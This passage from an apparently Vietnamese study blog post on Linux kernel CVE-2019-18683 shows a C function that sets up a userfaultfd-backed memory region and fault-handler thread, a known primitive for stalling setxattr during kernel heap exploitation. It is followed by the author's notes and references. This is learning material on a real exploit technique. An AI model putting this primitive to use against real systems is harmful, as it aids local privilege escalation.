</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-objectivec" data-lang="objectivec">
<span class="kt">void</span> <span class="nf">init_setxattr_userfaultfd</span><span class="p">(){</span>
    <span class="kt">long</span> <span class="n">uffd</span><span class="p">;</span> <span class="cm">/* userfaultfd file descriptor */</span>
                <span class="cm">/* start of region handled by userfaultfd */</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">len</span><span class="p">;</span> <span class="cm">/* Length of region handled by userfaultfd */</span>
    <span class="n">pthread_t</span> <span class="n">thr</span><span class="p">;</span> <span class="cm">/* ID of thread taht handles pagefaults */</span>
    <span class="k">struct</span> <span class="n">uffdio_api</span> <span class="n">uffdio_api</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">uffdio_register</span> <span class="n">uffdio_register</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">s</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] init_setxattr_userfaultfd</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">page_size</span> <span class="o">=</span> <span class="n">sysconf</span><span class="p">(</span><span class="n">_SC_PAGE_SIZE</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] pagesize = %lf</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">page_size</span><span class="p">);</span>
    <span class="n">pthread_t</span> <span class="n">thr2</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">len</span> <span class="o">=</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">page_size</span><span class="p">;</span>
    
    <span class="cm">/* Create and enable userfaultfd object */</span>
    <span class="n">uffd</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_userfaultfd</span><span class="p">,</span> <span class="n">O_CLOEXEC</span> <span class="o">|</span> <span class="n">O_NONBLOCK</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">uffd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">err_exit</span><span class="p">(</span><span class="s">&#34;userfaultfd&#34;</span><span class="p">);</span>
    <span class="n">uffdio_api</span><span class="p">.</span><span class="n">api</span> <span class="o">=</span> <span class="n">UFFD_API</span><span class="p">;</span>
    <span class="n">uffdio_api</span><span class="p">.</span><span class="n">features</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="n">UFFDIO_API</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">uffdio_api</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">err_exit</span><span class="p">(</span><span class="s">&#34;ioctl-UFFDIO_API&#34;</span><span class="p">);</span>
    
    <span class="cm">/* Create a private anonymous mapping. The memory will be
</span><span class="cm">    demand-zero paged--that is, not yet allocated. When we
</span><span class="cm">    actually touch the memory, it will be allocated via 
</span><span class="cm">    the userfaultfd. */</span>
    <span class="n">xattr_addr</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
                <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] The sexattr_addr anonymous page_addr: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">xattr_addr</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">xattr_addr</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
        <span class="n">err_exit</span><span class="p">(</span><span class="s">&#34;mmap&#34;</span><span class="p">);</span>
    
    <span class="n">uffdio_register</span><span class="p">.</span><span class="n">range</span><span class="p">.</span><span class="n">start</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">xattr_addr</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">page_size</span><span class="p">;</span>
    <span class="n">uffdio_register</span><span class="p">.</span><span class="n">range</span><span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="mi">2</span><span class="o">*</span><span class="n">page_size</span><span class="p">;</span>
    <span class="n">uffdio_register</span><span class="p">.</span><span class="n">mode</span> <span class="o">=</span> <span class="n">UFFDIO_REGISTER_MODE_MISSING</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="n">UFFDIO_REGISTER</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">uffdio_register</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">err_exit</span><span class="p">(</span><span class="s">&#34;ioctl-UFFDIO_REGISTER&#34;</span><span class="p">);</span>
    
    <span class="cm">/* Create a thread that will process the userfaultfd events */</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">thr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">fault_handler_thread</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">uffd</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">s</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">errno</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
        <span class="n">err_exit</span><span class="p">(</span><span class="s">&#34;pthread_create&#34;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

</code></pre></td></tr></table>
</div>
</div><p>Trong hàm này, tôi chú ý tới một số điểm - những điểm này đối với tôi ở thời điểm hiện tại đọc không hiểu / chưa hiểu rõ:</p>
<ol>
<li>Hàm <code>sysconf(_SC_PAGE_SIZE)</code>:</li>
</ol>
<h2 id="nguồn-tham-khảo">Nguồn tham khảo</h2>
<ul>
<li><a href="https://www.programmersought.com/article/80733633259/">https://www.programmersought.com/article/80733633259/</a></li>
<li><a href="https://zoomadmin.com/HowToInstall/UbuntuPackage/linux-tools-virtual-lts-vivid">https://zoomadmin.com/HowToInstall/UbuntuPackage/linux-tools-virtual-lts-vivid</a></li>
<li><a href="https://www.anquanke.com/post/id/200029">https://www.anquanke.com/post/id/200029</a></li>
</ul>

    </article>
    
    
<script defer src="/js/clipboard.min.1626706afc88d95ebe1173b553ec732c6dc82a576989315fdf5e7779af738a44.js"></script>

<script defer src="/js/helper/prev.min.js"></script>

<script defer src="/js/helper/prop.min.js"></script>
<script>
  'use strict';
  document.addEventListener('DOMContentLoaded', function () {
    
    var clipInit = false;
    var preChromaElem = document.querySelectorAll('pre.chroma');
    var langCodeElem = document.querySelectorAll('.language-code');
    var dollarCodeElem = document.querySelectorAll('div.language-\\$');
    var gtCodeElem = document.querySelectorAll('div.language-\\>');

    var makeClipboard = function(elem) {
      var code = elem,
          text = elem.textContent;
        
      if (text.length > 15) {
        if (!clipInit) {
          var text, clip = new ClipboardJS('.copy-to-clipboard', {
            text: function (trigger) {
              var codeElem = prev(trigger).querySelectorAll('code');
              if (codeElem.length > 1) {
                text = prev(trigger).querySelector('code[class^="language-"]').textContent;
              } else {
                text = prev(trigger).querySelector('code').textContent;
              }

              return text.replace(/^\$\s/gm, '');
            }
          });

          var inPre;
          clip.on('success', function (e) {
            e.clearSelection();
            inPre = prop(e.trigger.parentNode, 'tagName') == 'PRE';
            e.trigger.setAttribute('aria-label', 'Copied to clipboard!');
            e.trigger.classList.add('tooltipped');
            e.trigger.classList.add('tooltipped-w');
          });

          clip.on('error', function (e) {
            inPre = prop(e.trigger.parentNode, 'tagName') == 'PRE';
            e.trigger.setAttribute('aria-label', e.action.toString());
            e.trigger.classList.add('tooltipped');
            e.trigger.classList.add('tooltipped-w');
          });

          clipInit = true;
        }

        var notAllowedClass = ['language-mermaid', 'language-viz', 'language-wave', 'language-chart', 'language-msc', 'language-flowchart'];
        var isNotAllowedIncluded = false;
        var curClassName = code.getAttribute('class');

        for (var i = 0; i < notAllowedClass.length; i++) {
          if (curClassName && curClassName.startsWith(notAllowedClass[i])) {
            isNotAllowedIncluded = true;
            break;
          }
        }

        if (!isNotAllowedIncluded) {
          if (curClassName) {
            var newClipboardElem = document.createElement('span');
            newClipboardElem.setAttribute('class', 'copy-to-clipboard');
            newClipboardElem.setAttribute('title', 'Copy to clipboard');
            elem.parentNode.parentNode.insertBefore(newClipboardElem, elem.parentNode.nextElementSibling);
          }
        }
      }
    }

    var makeSymbolClipboard = function(elem) {
      var clipboardSpan = document.createElement('span');
      clipboardSpan.setAttribute('class', 'copy-to-clipboard');
      clipboardSpan.setAttribute('title', 'Copy to clipboard');
      elem.parentNode.parentNode.insertBefore(clipboardSpan, elem.parentNode.nextElementSibling);
    }

    preChromaElem ? 
    preChromaElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function(codeElem) {
        makeClipboard(codeElem);
      });
    }) : null;
    
    langCodeElem ? 
    langCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeClipboard(codeElem);
      });
    }) : null;

    dollarCodeElem ? 
    dollarCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeSymbolClipboard(codeElem);
      });
    }) : null;

    gtCodeElem ?
    gtCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeSymbolClipboard(codeElem);
      });
    }) : null;
    
  });
</script>
    <script>
  'use strict';
  
  function wrap(el, wrapper) {
    el.parentNode.insertBefore(wrapper, el);
    wrapper.appendChild(el);
  }

  (function () {
    var singleContentsElem = document.querySelector('.single__contents');
    singleContentsElem ? 
    singleContentsElem.querySelectorAll('pre > code').forEach(function(elem) {
      var dataLang = elem.getAttribute('data-lang');
      var dataLangWrapper = document.createElement('div');
      var code = null;
      var codeTitle = null;

      if (dataLang && dataLang.includes(':')) {
        code = dataLang.split(':')[0];
        codeTitle = dataLang.split(':')[1];

        dataLangWrapper.className = 'language-' + code;
        dataLangWrapper.setAttribute('data-lang', codeTitle);

        elem.className = 'language-' + code;
        elem.setAttribute('data-lang', codeTitle);
        elem.setAttribute('id', codeTitle);
      } else if (!dataLang) {
        dataLangWrapper.setAttribute('data-lang', 'Code');
        dataLangWrapper.className = 'language-code';
      }

      if (!dataLang || codeTitle) {
        wrap(elem.parentNode, dataLangWrapper);
      }

    }) : null;
  })();

  var langCodeElem = document.querySelectorAll('.language-code');
  langCodeElem ? langCodeElem.forEach(function (elem) {
    var newElem = document.createElement('span');
    newElem.className = 'copy-to-clipboard';
    newElem.setAttribute('title', 'Copy to clipboard');
    elem.append(newElem);
  }) : null;
  

  

  
  var dollarCodeElem = document.querySelectorAll('div.language-\\$');
  var gtCodeElem = document.querySelectorAll('div.language-\\>');

  dollarCodeElem ?
  dollarCodeElem.forEach(function(elem) {
    var lnts = elem.parentNode.parentNode ? elem.parentNode.parentNode.querySelectorAll('.lnt') : null;
    lnts ? 
    lnts.forEach(function(lnt) {
      lnt.innerHTML = '$<br/>';
    }) : null;
  }) : null;

  gtCodeElem ?
  gtCodeElem.forEach(function(elem) {
    var lnts = elem.parentNode.parentNode ? elem.parentNode.parentNode.querySelectorAll('.lnt') : null;
    lnts ? 
    lnts.forEach(function(lnt) {
      lnt.innerHTML = '><br/>';
    }) : null;
  }) : null;
  
</script>
    
<div class="donation">
  <div class="donation__message">
    Share on
  </div>
  <div class="donation__icons">
    
    
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fminhlongmt183.github.io%2fposts%2fcve-2019-18683%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
          <svg data-name="facebook" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m15.997 3.985h2.191v-3.816c-.378-.052-1.678-.169-3.192-.169-3.159 0-5.323 1.987-5.323 5.639v3.361h-3.486v4.266h3.486v10.734h4.274v-10.733h3.345l.531-4.266h-3.877v-2.939c.001-1.233.333-2.077 2.051-2.077z"/></svg>
        </a>
      
    
      
        <a href="https://twitter.com/intent/tweet?text=T%c3%acm%20hi%e1%bb%83u%20v%e1%bb%81%20CVE-2019-18683&url=https%3a%2f%2fminhlongmt183.github.io%2fposts%2fcve-2019-18683%2f&hashtags=cve%2c%20linux%20kernel%2c%20V4l2&via=Edisc" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
          <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
        </a>
      
    
  </div>
</div>


    
    
<div class="whoami__gutter"></div>
<hr class="hr-slash whoami-hr"/>
<section class="whoami">
  <div class="whoami__image-wrapper">
    
    
      
        <img data-src="/images/whoami/avatar.jpg" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" alt="Edisc" class="lazyload whoami__image"/>
      
    
  </div>
  <div class="whoami__contents">
    <div class="whoami__written-by">
      WRITTEN BY
    </div>
    <div class="whoami__title">
      
        Edisc
      
    </div>
    <div class="whoami__desc">
      
        Code Reverser
      
    </div>
    <div class="whoami__social">
      
      
      
      
      
      
      
      
      <a href="mailto:edisc.ctf@gmail.com" title="email" aria-label="email">
        <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-.4 4.25l-7.07 4.42c-.32.2-.74.2-1.06 0L4.4 8.25c-.25-.16-.4-.43-.4-.72 0-.67.73-1.07 1.3-.72L12 11l6.7-4.19c.57-.35 1.3.05 1.3.72 0 .29-.15.56-.4.72z"/></svg>
      </a>
      
      
      
      <a href="https://www.facebook.com/minhlongv84" title="facebook" aria-label="facebook">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25" height="25" viewBox="0 0 24 24" version="1.1">
<g id="surface2747">
<path fill="currentColor" d="M 11.664062 2.003906 C 6.621094 2.171875 2.375 6.25 2.023438 11.289062 C 1.65625 16.617188 5.46875 21.121094 10.507812 21.878906 L 10.507812 14.648438 L 8.890625 14.648438 C 8.164062 14.648438 7.578125 14.0625 7.578125 13.335938 C 7.578125 12.609375 8.164062 12.023438 8.890625 12.023438 L 10.503906 12.023438 L 10.503906 10.273438 C 10.503906 7.378906 11.914062 6.105469 14.324219 6.105469 C 14.679688 6.105469 14.984375 6.113281 15.242188 6.128906 C 15.878906 6.15625 16.371094 6.6875 16.371094 7.324219 C 16.371094 7.988281 15.835938 8.523438 15.171875 8.523438 L 14.730469 8.523438 C 13.710938 8.523438 13.351562 9.492188 13.351562 10.585938 L 13.351562 12.023438 L 15.222656 12.023438 C 15.8125 12.023438 16.265625 12.550781 16.175781 13.132812 L 16.066406 13.835938 C 15.992188 14.304688 15.589844 14.652344 15.113281 14.652344 L 13.351562 14.652344 L 13.351562 21.898438 C 18.234375 21.234375 22 17.0625 22 12 C 22 6.367188 17.339844 1.820312 11.664062 2.003906 Z M 11.664062 2.003906 "/>
</g>
</svg>

      </a>
      
      
      
      
      
      <a href="https://github.com/minhlongmt183/" title="github" aria-label="github">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25" height="25" viewBox="0 0 24 24" version="1.1">
<g id="surface3680">
<path fill="currentColor" d="M 10.898438 2.101562 C 6.300781 2.601562 2.601562 6.300781 2.101562 10.800781 C 1.601562 15.5 4.300781 19.699219 8.398438 21.300781 C 8.699219 21.398438 9 21.199219 9 20.800781 L 9 19.199219 C 9 19.199219 8.601562 19.300781 8.101562 19.300781 C 6.699219 19.300781 6.101562 18.101562 6 17.398438 C 5.898438 17 5.699219 16.699219 5.398438 16.398438 C 5.101562 16.300781 5 16.300781 5 16.199219 C 5 16 5.300781 16 5.398438 16 C 6 16 6.5 16.699219 6.699219 17 C 7.199219 17.800781 7.800781 18 8.101562 18 C 8.5 18 8.800781 17.898438 9 17.800781 C 9.101562 17.101562 9.398438 16.398438 10 16 C 7.699219 15.5 6 14.199219 6 12 C 6 10.898438 6.5 9.800781 7.199219 9 C 7.101562 8.800781 7 8.300781 7 7.601562 C 7 7.199219 7 6.601562 7.300781 6 C 7.300781 6 8.699219 6 10.101562 7.300781 C 10.601562 7.101562 11.300781 7 12 7 C 12.699219 7 13.398438 7.101562 14 7.300781 C 15.300781 6 16.800781 6 16.800781 6 C 17 6.601562 17 7.199219 17 7.601562 C 17 8.398438 16.898438 8.800781 16.800781 9 C 17.5 9.800781 18 10.800781 18 12 C 18 14.199219 16.300781 15.5 14 16 C 14.601562 16.5 15 17.398438 15 18.300781 L 15 20.898438 C 15 21.199219 15.300781 21.5 15.699219 21.398438 C 19.398438 19.898438 22 16.300781 22 12.101562 C 22 6.101562 16.898438 1.398438 10.898438 2.101562 Z M 10.898438 2.101562 "/>
</g>
</svg>

      </a>
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
    </div>
  </div>
</section>
<hr class="hr-slash whoami-hr" />


    <section class="related">
    
    
  </section>
    <div class="grow"></div>
<nav class="pagination-single">
  
    
      <a href="https://minhlongmt183.github.io/posts/wining_the_racing/" class="pagination-single__left">
        <div class="pagination-single__icon">
          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M19 11H7.83l4.88-4.88c.39-.39.39-1.03 0-1.42-.39-.39-1.02-.39-1.41 0l-6.59 6.59c-.39.39-.39 1.02 0 1.41l6.59 6.59c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L7.83 13H19c.55 0 1-.45 1-1s-.45-1-1-1z"/></svg>
        </div>
        <div class="pagination-single__left-title">Wining the racing</div>      
      </a>
    
    <div class="grow"></div>
    
      <a href="https://minhlongmt183.github.io/posts/cve-2021-3156/" class="pagination-single__right">      
        <div class="pagination-single__right-title">Tìm hiểu về CVE-2021–3156 (A Sudo vulnerability)</div>
        <div class="pagination-single__icon">
          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/></svg>
        </div>
      </a>
    
  
</nav>
    
  
    <div id="utterances"></div>
<noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    function checkTheme(local, base) {
      var currentTheme = local || base;

      if (currentTheme === "dark") {
        return "photon-dark";
      } else if (currentTheme === "hacker") {
        return "photon-dark";
      } else if (currentTheme === "kimbie") {
        return "github-dark-orange";
      } else {
        return "github-light";
      }
    }

    try {
      
      var owner = JSON.parse("\"minhlongmt183\"");
      
      var repo = JSON.parse("\"comments\"");
      
      var baseTheme = JSON.parse("\"dark\"");
      var localTheme = localStorage.getItem('theme');
      var utterTheme = checkTheme(localTheme, baseTheme);
      var myScript = document.createElement('script');
      myScript.setAttribute('src', 'https://utteranc.es/client.js');
      myScript.setAttribute('repo', `${owner}/${repo}`);
      myScript.setAttribute('issue-term', 'pathname');
      myScript.setAttribute('theme', utterTheme);
      myScript.setAttribute('crossorigin', 'anonymous');
      myScript.setAttribute('async', '');
      myScript.onload = function() {
      }

      

      document.getElementById('utterances').appendChild(myScript);
    } catch (err) {
      console.log(err);
    }
  });
</script>

<div id="comments-fallback" class="viaemail">
    <div class="utterances__message">
        
        <a href="https://github.com/minhlongmt183/comments/issues/" target="_blank" rel="noreferrer">&nbsp;</a>
    </div>
</div>

  

    <div class="modal micromodal-slide" id="modal" aria-hidden="true">
  <div class="modal__overlay" tabindex="-1" data-micromodal-close>
    <div class="modal__container" role="dialog" aria-modal="true" aria-labelledby="modal-title">
      
      <div class="modal__content" id="modal-content">
        <div id="mySwipe" class="swipe">
          <div class="swipe-wrap">
          </div>
        </div>
      </div>

      <span class="modal__items">
        
        <span class="modal__header">
          <div class="modal__paging" title="Page Info" aria-label="Current Page">
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--close" title="Close" aria-label="Close Button" data-micromodal-close>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="25" height="25"><path fill="currentColor" d="M 21.734375 19.640625 L 19.636719 21.734375 C 19.253906 22.121094 18.628906 22.121094 18.242188 21.734375 L 13 16.496094 L 7.761719 21.734375 C 7.375 22.121094 6.746094 22.121094 6.363281 21.734375 L 4.265625 19.640625 C 3.878906 19.253906 3.878906 18.628906 4.265625 18.242188 L 9.503906 13 L 4.265625 7.761719 C 3.882813 7.371094 3.882813 6.742188 4.265625 6.363281 L 6.363281 4.265625 C 6.746094 3.878906 7.375 3.878906 7.761719 4.265625 L 13 9.507813 L 18.242188 4.265625 C 18.628906 3.878906 19.257813 3.878906 19.636719 4.265625 L 21.734375 6.359375 C 22.121094 6.746094 22.121094 7.375 21.738281 7.761719 L 16.496094 13 L 21.734375 18.242188 C 22.121094 18.628906 22.121094 19.253906 21.734375 19.640625 Z"/></svg>
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--full" title="Full Screen" aria-label="Full Screen Button">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="25" height="25"><path fill="currentColor" d="M 5 3 C 3.9069372 3 3 3.9069372 3 5 L 3 8 A 1.0001 1.0001 0 1 0 5 8 L 5 5 L 8 5 A 1.0001 1.0001 0 1 0 8 3 L 5 3 z M 16 3 A 1.0001 1.0001 0 1 0 16 5 L 19 5 L 19 8 A 1.0001 1.0001 0 1 0 21 8 L 21 5 C 21 3.9069372 20.093063 3 19 3 L 16 3 z M 3.984375 14.986328 A 1.0001 1.0001 0 0 0 3 16 L 3 19 C 3 20.093063 3.9069372 21 5 21 L 8 21 A 1.0001 1.0001 0 1 0 8 19 L 5 19 L 5 16 A 1.0001 1.0001 0 0 0 3.984375 14.986328 z M 19.984375 14.986328 A 1.0001 1.0001 0 0 0 19 16 L 19 19 L 16 19 A 1.0001 1.0001 0 1 0 16 21 L 19 21 C 20.093063 21 21 20.093063 21 19 L 21 16 A 1.0001 1.0001 0 0 0 19.984375 14.986328 z"/></svg>
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--normal" title="Normal Screen" aria-label="Normal Screen Button">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="25" height="25"><path fill="currentColor" d="M 16.96875 4.972656 C 15.867188 4.988281 14.984375 5.894531 15 7 L 15 15 L 7 15 C 6.277344 14.988281 5.609375 15.367188 5.246094 15.992188 C 4.878906 16.613281 4.878906 17.386719 5.246094 18.007813 C 5.609375 18.632813 6.277344 19.011719 7 19 L 19 19 L 19 7 C 19.007813 6.460938 18.796875 5.941406 18.414063 5.558594 C 18.03125 5.175781 17.511719 4.964844 16.96875 4.972656 Z M 32.96875 4.972656 C 31.921875 4.988281 31.0625 5.8125 31.003906 6.859375 C 31 6.90625 31 6.953125 31 7 L 31 19 L 43 19 C 43.066406 19 43.132813 19 43.199219 18.992188 C 44.269531 18.894531 45.070313 17.972656 45.015625 16.902344 C 44.964844 15.828125 44.074219 14.988281 43 15 L 35 15 L 35 7 C 35.007813 6.460938 34.796875 5.941406 34.414063 5.558594 C 34.03125 5.175781 33.511719 4.964844 32.96875 4.972656 Z M 7 31 C 6.277344 30.988281 5.609375 31.367188 5.246094 31.992188 C 4.878906 32.613281 4.878906 33.386719 5.246094 34.007813 C 5.609375 34.632813 6.277344 35.011719 7 35 L 15 35 L 15 43 C 14.988281 43.722656 15.367188 44.390625 15.992188 44.753906 C 16.613281 45.121094 17.386719 45.121094 18.007813 44.753906 C 18.632813 44.390625 19.011719 43.722656 19 43 L 19 31 Z M 31 31 L 31 43 C 30.988281 43.722656 31.367188 44.390625 31.992188 44.753906 C 32.613281 45.121094 33.386719 45.121094 34.007813 44.753906 C 34.632813 44.390625 35.011719 43.722656 35 43 L 35 35 L 43 35 C 43.722656 35.011719 44.390625 34.632813 44.753906 34.007813 C 45.121094 33.386719 45.121094 32.613281 44.753906 31.992188 C 44.390625 31.367188 43.722656 30.988281 43 31 Z"/></svg>
          </div>
        </span>
        
        <div class="modal__icon modal__arrow modal__arrow--left" title="Arrow Left" aria-label="Arrow Left Button">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="28" height="28"><path fill="currentColor" d="M 23.28125 11 L 10 10 L 10 6.851563 C 10 6.523438 9.839844 6.277344 9.519531 6.03125 C 9.199219 5.949219 8.878906 5.949219 8.640625 6.113281 C 5.359375 8.410156 2.238281 12.257813 2.160156 12.421875 C 2.082031 12.578125 2.007813 12.8125 2.003906 12.976563 C 2.003906 12.980469 2 12.988281 2 12.992188 C 2 13.15625 2.078125 13.402344 2.160156 13.484375 C 2.238281 13.648438 5.28125 17.507813 8.640625 19.804688 C 8.960938 19.96875 9.28125 20.050781 9.519531 19.886719 C 9.839844 19.722656 10 19.476563 10 19.148438 L 10 16 L 23.28125 15 C 23.679688 14.679688 24 13.875 24 12.992188 C 24 12.195313 23.761719 11.320313 23.28125 11 Z"/></svg>
        </div>
        
        <div class="modal__icon modal__arrow modal__arrow--right" title="Arrow Right" aria-label="Arrow Right Button">

